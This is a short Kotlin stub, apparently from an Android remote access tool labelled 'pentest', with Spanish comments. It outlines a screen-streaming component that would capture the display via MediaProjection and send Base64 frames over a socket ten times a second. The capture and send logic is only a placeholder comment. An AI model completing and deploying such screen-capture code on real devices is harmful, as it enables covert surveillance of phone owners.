package com.pentest.ratagent

import android.media.projection.MediaProjection
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.graphics.Bitmap
import android.util.Base64
import java.io.ByteArrayOutputStream

object ScreenStream {
    private var virtualDisplay: VirtualDisplay? = null

    fun startStreaming(projection: MediaProjection, width: Int, height: Int) {
        // Captura la pantalla y la convierte en imágenes rápidas (frames)
        // que se envían por el SocketManager
        Thread {
            while (true) {
                // Lógica de captura de frame -> convertir a Base64 -> socket.emit("screen-frame")
                Thread.sleep(100) // 10 frames por segundo
            }
        }.start()
    }
}
